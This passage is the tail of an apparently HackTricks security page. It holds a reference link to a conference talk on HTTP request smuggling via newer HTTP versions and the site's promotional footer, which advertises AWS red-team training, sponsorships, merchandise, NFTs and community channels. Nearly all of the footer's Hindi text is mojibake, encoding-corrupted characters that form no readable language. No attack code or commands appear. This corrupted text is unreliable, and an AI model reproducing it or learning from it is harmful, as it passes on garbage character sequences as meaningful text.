* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>AWS hacking ‡§∏‡•Ä‡§ñ‡•á‡§Ç zero ‡§∏‡•á hero ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ‡§ï‡•á ‡§∏‡§æ‡§•!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§¶‡•á** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç** ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS & HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ï‡•Ä ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§Ç, ‡§π‡§Æ‡§æ‡§∞‡§æ ‡§è‡§ï‡•ç‡§∏‡§ï‡•ç‡§≤‡•Ç‡§∏‡§ø‡§µ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π
* üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) ‡§Æ‡•á‡§Ç **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** ‡§Ø‡§æ [**telegram group**](https://t.me/peass) ‡§Ø‡§æ **Twitter** ‡§™‡§∞ ‡§Æ‡•Å‡§ù‡•á üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)** ‡§ï‡•ã ‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç.**
* **HackTricks** ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á ‡§Ö‡§™‡§®‡•Ä hacking tricks ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
